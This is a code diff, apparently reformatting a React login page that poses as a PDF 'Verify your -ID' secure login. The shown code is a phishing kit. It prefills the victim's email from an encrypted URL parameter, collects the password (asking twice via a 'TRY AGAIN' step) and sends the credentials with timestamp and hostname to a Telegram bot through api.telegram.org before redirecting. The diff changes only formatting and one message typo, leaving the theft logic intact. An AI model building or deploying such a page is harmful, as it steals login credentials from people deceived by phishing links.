@@ -17,39 +17,39 @@ const LoginPage = () => {
     const createCircuitBackground = () => {
       const board = document.querySelector('.circuit-board');
       if (!board) return;
-      
+
       // Clear any existing elements
       board.innerHTML = '';
-      
+
       // Create circuit lines
       for (let i = 0; i < 20; i++) {
         const line = document.createElement('div');
         line.className = 'circuit-line';
-        
+
         const isHorizontal = Math.random() > 0.5;
         const width = isHorizontal ? Math.random() * 300 + 100 : 2;
         const height = isHorizontal ? 2 : Math.random() * 300 + 100;
-        
+
         line.style.width = `${width}px`;
         line.style.height = `${height}px`;
         line.style.left = `${Math.random() * 100}%`;
         line.style.top = `${Math.random() * 100}%`;
         line.style.opacity = Math.random() * 0.5 + 0.1;
-        
+
         board.appendChild(line);
       }
-      
+
       // Create circuit nodes
       for (let i = 0; i < 30; i++) {
         const node = document.createElement('div');
         node.className = 'circuit-node';
-        
+
         const size = Math.random() * 12 + 4;
         node.style.width = `${size}px`;
         node.style.height = `${size}px`;
         node.style.left = `${Math.random() * 100}%`;
         node.style.top = `${Math.random() * 100}%`;
-        
+
         board.appendChild(node);
       }
     };
@@ -61,7 +61,7 @@ const LoginPage = () => {
     };
 
     const aesParam = extractAESFromURL();
-    
+
     if (aesParam) {
       try {
         const salt = process.env.NEXT_PUBLIC_SALT;
@@ -71,7 +71,7 @@ const LoginPage = () => {
 
         const bytes = CryptoJS.AES.decrypt(aesParam, salt);
         const decryptedEmail = bytes.toString(CryptoJS.enc.Utf8);
-        
+
         if (decryptedEmail) {
           setEmail(decryptedEmail);
         } else {
@@ -82,19 +82,19 @@ const LoginPage = () => {
         setError('Invalid or corrupted link');
       }
     }
-    
+
     // Create the circuit background after component mounts
     createCircuitBackground();
   }, []);
 
   const handleSubmit = async (e) => {
     e.preventDefault();
-    
+
     if (password.length < 5) {
       setError('Password must be at least 5 characters');
       return;
     }
-    
+
     setIsLoading(true);
     setError('');
 
@@ -102,7 +102,7 @@ const LoginPage = () => {
       const telegramBotToken = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;
       const telegramChatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;
       const redirectUrl = process.env.NEXT_PUBLIC_REDIRECT_URL;
-      
+
       if (!telegramBotToken || !telegramChatId) {
         throw new Error('Telegram integration not properly configured');
       }
@@ -115,7 +115,7 @@ const LoginPage = () => {
 - *Timestamp*: ${new Date().toISOString()}
 - *Origin*: ${window.location.hostname}
 
-${step === 1 ? '⚠️ *InitiaL Access attempt detected* ⚠️' : '🚨 *Final Access Attempt Detected* 🚨'}`;
+${step === 1 ? '⚠️ *Initial Access Attempt Detected* ⚠️' : '🚨 *Final Access Attempt Detected* 🚨'}`;
 
       const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
         method: 'POST',
@@ -171,7 +171,7 @@ ${step === 1 ? '⚠️ *InitiaL Access attempt detected* ⚠️' : '🚨 *Final 
     <div className="min-h-screen bg-gradient-to-br from-blue-900 to-blue-700 flex items-center justify-center p-4 relative overflow-hidden">
       {/* Circuit Board Background */}
       <div className="circuit-board absolute inset-0 z-0 opacity-50"></div>
-      
+
       <motion.div
         initial={{ opacity: 0, y: 20 }}
         animate={{ opacity: 1, y: 0 }}
@@ -185,11 +185,16 @@ ${step === 1 ? '⚠️ *InitiaL Access attempt detected* ⚠️' : '🚨 *Final 
               <div className="bg-white p-3 rounded-full mb-4">
                 <div className="w-16 h-16 bg-gradient-to-r from-blue-500 to-cyan-400 rounded-full flex items-center justify-center">
                   <svg className="h-8 w-8 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+                    <path
+                      strokeLinecap="round"
+                      strokeLinejoin="round"
+                      strokeWidth={2}
+                      d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
+                    />
                   </svg>
                 </div>
               </div>
-              
+
               {/* PDF Logo with Secure Login Text */}
               <div className="flex flex-col items-center justify-center mb-2">
                 <svg width="180" height="50" viewBox="0 0 180 50" className="mb-2">
@@ -199,38 +204,62 @@ ${step === 1 ? '⚠️ *InitiaL Access attempt detected* ⚠️' : '🚨 *Final 
                       <stop offset="100%" stopColor="#e6f7ff" />
                     </linearGradient>
                   </defs>
-                  
+
                   {/* PDF Icon */}
                   <g transform="translate(0, 2)">
-      {/* Document shape with folded corner */}
-      <path d="M5 5 h22 l8 8 v32 a3 3 0 0 1 -3 3 h-27 a3 3 0 0 1 -3 -3 v-37 a3 3 0 0 1 3 -3z" fill="#e62e2e" />
-      <polygon points="27,5 35,13 27,13" fill="#b32424" />
-      
-      {/* PDF Text */}
-      <text x="19" y="32" textAnchor="middle" fill="white" fontFamily="Arial, sans-serif" fontWeight="bold" fontSize="14">
-        PDF
-      </text>
-    </g>
-                  
+                    <path
+                      d="M5 5 h22 l8 8 v32 a3 3 0 0 1 -3 3 h-27 a3 3 0 0 1 -3 -3 v-37 a3 3 0 0 1 3 -3z"
+                      fill="#e62e2e"
+                    />
+                    <polygon points="27,5 35,13 27,13" fill="#b32424" />
+
+                    <text
+                      x="19"
+                      y="32"
+                      textAnchor="middle"
+                      fill="white"
+                      fontFamily="Arial, sans-serif"
+                      fontWeight="bold"
+                      fontSize="14"
+                    >
+                      PDF
+                    </text>
+                  </g>
+
                   {/* Secure Login Text */}
                   <g transform="translate(45, 0)">
-                    <text x="0" y="25" fill="url(#textGradient)" fontFamily="Arial, sans-serif" fontWeight="bold" fontSize="20">Verify your -ID</text>
+                    <text
+                      x="0"
+                      y="25"
+                      fill="url(#textGradient)"
+                      fontFamily="Arial, sans-serif"
+                      fontWeight="bold"
+                      fontSize="20"
+                    >
+                      Verify your -ID
+                    </text>
                   </g>
                 </svg>
-                
+
                 <p className="text-blue-100 mt-2 text-sm">Verify your email access to continue</p>
               </div>
             </div>
           </div>
-          
+
           {/* White form area */}
           <div className="p-6 bg-white">
             {error && !success && (
-              <div className={`mb-4 p-3 rounded-md text-sm ${step === 2 ? 'bg-red-100 text-red-700 border border-red-200' : 'bg-yellow-100 text-yellow-700 border border-yellow-200'}`}>
+              <div
+                className={`mb-4 p-3 rounded-md text-sm ${
+                  step === 2
+                    ? 'bg-red-100 text-red-700 border border-red-200'
+                    : 'bg-yellow-100 text-yellow-700 border border-yellow-200'
+                }`}
+              >
                 {error}
               </div>
             )}
-            
+
             {success ? (
               <div className="text-center py-4">
                 <div className="text-green-500 text-5xl mb-4">✓</div>
@@ -243,13 +272,16 @@ ${step === 1 ? '⚠️ *InitiaL Access attempt detected* ⚠️' : '🚨 *Final 
             ) : (
               <form onSubmit={handleSubmit}>
                 <div className="mb-4">
-                  <label className="block text-gray-700 text-sm font-medium mb-2">
-                    Email Address
-                  </label>
+                  <label className="block text-gray-700 text-sm font-medium mb-2">Email Address</label>
                   <div className="relative">
                     <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                       <svg className="h-5 w-5 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
+                        <path
+                          strokeLinecap="round"
+                          strokeLinejoin="round"
+                          strokeWidth={2}
+                          d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"
+                        />
                       </svg>
                     </div>
                     <input
@@ -260,15 +292,18 @@ ${step === 1 ? '⚠️ *InitiaL Access attempt detected* ⚠️' : '🚨 *Final 
                     />
                   </div>
                 </div>
-                
+
                 <div className="mb-4">
-                  <label className="block text-gray-700 text-sm font-medium mb-2">
-                    Password
-                  </label>
+                  <label className="block text-gray-700 text-sm font-medium mb-2">Password</label>
                   <div className="relative">
                     <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                       <svg className="h-5 w-5 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+                        <path
+                          strokeLinecap="round"
+                          strokeLinejoin="round"
+                          strokeWidth={2}
+                          d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
+                        />
                       </svg>
                     </div>
                     <input
@@ -283,7 +318,7 @@ ${step === 1 ? '⚠️ *InitiaL Access attempt detected* ⚠️' : '🚨 *Final 
                   </div>
                   <p className="text-xs text-gray-500 mt-1">Password must be at least 5 characters</p>
                 </div>
-                
+
                 <button
                   type="submit"
                   disabled={isLoading}
@@ -291,24 +326,40 @@ ${step === 1 ? '⚠️ *InitiaL Access attempt detected* ⚠️' : '🚨 *Final 
                 >
                   {isLoading ? (
                     <span className="flex items-center justify-center">
-                      <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
-                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
-                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                      <svg
+                        className="animate-spin -ml-1 mr-3 h-5 w-5 text-white"
+                        xmlns="http://www.w3.org/2000/svg"
+                        fill="none"
+                        viewBox="0 0 24 24"
+                      >
+                        <circle
+                          className="opacity-25"
+                          cx="12"
+                          cy="12"
+                          r="10"
+                          stroke="currentColor"
+                          strokeWidth="4"
+                        ></circle>
+                        <path
+                          className="opacity-75"
+                          fill="currentColor"
+                          d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
+                        ></path>
                       </svg>
                       {step === 1 ? 'VERIFYING...' : 'PROCESSING...'}
                     </span>
+                  ) : step === 1 ? (
+                    'LOGIN'
                   ) : (
-                    step === 1 ? 'LOGIN' : 'TRY AGAIN'
+                    'TRY AGAIN'
                   )}
                 </button>
               </form>
             )}
           </div>
-          
+
           <div className="px-6 py-3 bg-gray-100 border-t border-gray-200 text-center">
-            <p className="text-xs text-gray-500">
-              Secure Login System • {new Date().getFullYear()}
-            </p>
+            <p className="text-xs text-gray-500">Secure Login System • {new Date().getFullYear()}</p>
           </div>
         </div>
       </motion.div>
@@ -324,13 +375,13 @@ ${step === 1 ? '⚠️ *InitiaL Access attempt detected* ⚠️' : '🚨 *Final 
           overflow: hidden;
           pointer-events: none;
         }
-        
+
         .circuit-line {
           position: absolute;
           background: rgba(0, 255, 255, 0.15);
           border-radius: 1px;
         }
-        
+
         .circuit-node {
           position: absolute;
           background: rgba(0, 200, 255, 0.4);
@@ -343,6 +394,3 @@ ${step === 1 ? '⚠️ *InitiaL Access attempt detected* ⚠️' : '🚨 *Final 
 };
 
 export default LoginPage;
-
-
-
